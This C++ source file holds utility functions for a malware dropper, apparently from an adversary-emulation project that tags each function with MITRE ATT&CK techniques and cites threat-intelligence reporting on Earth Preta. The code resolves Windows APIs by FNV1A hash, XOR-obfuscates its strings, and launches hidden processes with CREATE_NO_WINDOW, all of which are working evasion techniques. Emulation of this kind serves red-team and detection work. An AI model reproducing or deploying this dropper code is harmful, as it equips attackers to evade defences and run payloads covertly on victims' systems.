#include "dropper_util.hpp"

// Modifies path by appending to_append to the parent directory of path.
// Assumes path has at least 1 backslash and does not start or end with one.
void ConcatToParent(wchar_t* path, size_t buf_size_wchar, const wchar_t* to_append) {
    // Get index of second-to-last back-slash
    size_t i = 0;
    size_t penult = 0; // index of second-to-last back-slash
    size_t ult = 0; // index of last back-slash
    while (path[i] != L'\0' && i < buf_size_wchar) {
        if (path[i] == L'\\') {
            penult = ult;
            ult = i;
        }
        i++;
    }

    size_t start = penult;
    if (penult == 0) {
        // Just one backslash - start copying after last backslash (root)
        start = ult + 1;
    } else {
        // At least 2 backslashes - start copying after penultimate backslash
        start++;
    }

    for (size_t j = 0; j + start < buf_size_wchar; j++) {
        path[j + start] = to_append[j];
        if (to_append[j] == L'\0') {
            break;
        }
    }

    // Truncate
    path[buf_size_wchar - 1] = L'\0';
}

/*
 * ResolveDropperAPIs:
 *      About:
 *          Dynamically resolve Windows APIs using the FNV1A hash.
 *      Result:
 *          Returns 0 on success, otherwise some error code
 *      MITRE ATT&CK Techniques:
 *          T1027.007: Obfuscated Files or Information: Dynamic API Resolution
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 */
DWORD ResolveDropperAPIs(dropper_func_pointers* fp, logger_ctx* log_ctx) {
    HMODULE h_shell32 = LoadLibraryW(XorStringW(L"Shell32.dll"));
    if (!h_shell32) {
        AesLogger::LogError(log_ctx, XorString("Failed to load Shell32.dll. Error code: %d"), fp->shared_fp.fp_GetLastError());
        return FAIL_LOAD_SHELL32;
    }
    fp->fp_CreateDirectoryW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CreateDirectoryW);
    if (!fp->fp_CreateDirectoryW) {
        AesLogger::LogError(log_ctx, XorString("Failed to resolve CreateDirectoryW API"));
        return FAIL_GET_CREATEDIRECTORYW;
    }
    fp->fp_GetModuleFileNameW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), GetModuleFileNameW);
    if (!fp->fp_GetModuleFileNameW) {
        AesLogger::LogError(log_ctx, XorString("Failed to resolve GetModuleFileNameW API"));
        return FAIL_GET_GETMODULEFILENAMEW;
    }
    fp->fp_CreateProcessW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), CreateProcessW);
    if (!fp->fp_CreateProcessW) {
        AesLogger::LogError(log_ctx, XorString("Failed to resolve CreateProcessW API"));
        return FAIL_GET_CREATEPROCESSW;
    }
    fp->fp_ShellExecuteW = RESOLVE_FN_FNV1A_BY_HMODULE(h_shell32, ShellExecuteW);
    if (!fp->fp_ShellExecuteW) {
        AesLogger::LogError(log_ctx, XorString("Failed to resolve ShellExecuteW API"));
        return FAIL_GET_SHELLEXECUTEW;
    }
    fp->fp_WaitForSingleObject = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), WaitForSingleObject);
    if (!(fp->fp_WaitForSingleObject)) {
        AesLogger::LogError(log_ctx, XorString("Failed to resolve WaitForSingleObject API"));
        return FAIL_GET_WAITFORSINGLEOBJECT;
    }
    fp->fp_GetExitCodeProcess = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), GetExitCodeProcess);
    if (!(fp->fp_GetExitCodeProcess)) {
        AesLogger::LogError(log_ctx, XorString("Failed to resolve GetExitCodeProcess API"));
        return FAIL_GET_GETEXITCODEPROCESS;
    }

    return ERROR_SUCCESS;
}

/*
 * CreateAndWaitForProcess:
 *      About:
 *          Execute process, wait for completion, and get exit code.
 *      Result:
 *          Returns 0 on success, otherwise some error code
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 */
DWORD CreateAndWaitForProcess(
    dropper_func_pointers* fp,
    logger_ctx* log_ctx,
    LPWSTR cmd,
    DWORD* exit_code
) {
    DWORD result;
    STARTUPINFOW startup_info;
    PROCESS_INFORMATION process_info;
    ZeroMemory(&process_info, sizeof(process_info));
    ZeroMemory(&startup_info, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    BOOL create_result = fp->fp_CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW, // dwCreationFlags
        NULL, // use environment of calling process
        NULL, // use current dir of calling process
        &startup_info,
        &process_info
    );

    if (!create_result) {
        result = fp->shared_fp.fp_GetLastError();
        AesLogger::LogError(log_ctx, XorString("Failed to create process. Error code: %d"), result);
        return result;
    } else {
        AesLogger::LogInfo(log_ctx, XorString("Created process with PID %d."), process_info.dwProcessId);

        // Wait up to 1 minute for process completion and grab exit code
        DWORD wait_result = fp->fp_WaitForSingleObject(process_info.hProcess, 60000);
        if (wait_result == WAIT_OBJECT_0) {
            // Process finished. Grab exit code
            if (!fp->fp_GetExitCodeProcess(process_info.hProcess, exit_code)) {
                result = fp->shared_fp.fp_GetLastError();
                AesLogger::LogError(log_ctx, XorString("Failed to get process exit code. Error code: %d"), result);
            } else {
                AesLogger::LogDebug(log_ctx, XorString("Process finished with exit code: %d"), *exit_code);
                result = ERROR_SUCCESS;
            }
        } else if (wait_result == WAIT_FAILED) {
            result = fp->shared_fp.fp_GetLastError();
            AesLogger::LogError(log_ctx, XorString("Failed to wait for process. Error code: %d"), result);
        } else if (wait_result == WAIT_TIMEOUT) {
            AesLogger::LogError(log_ctx, XorString("Timed out waiting for process."));
            result = wait_result;
        } else {
            AesLogger::LogError(log_ctx, XorString("Failed to wait for process. Wait result: %d"), wait_result);
            result = wait_result;
        }

        fp->shared_fp.fp_CloseHandle(process_info.hProcess);
        fp->shared_fp.fp_CloseHandle(process_info.hThread);
        return result;
    }
}
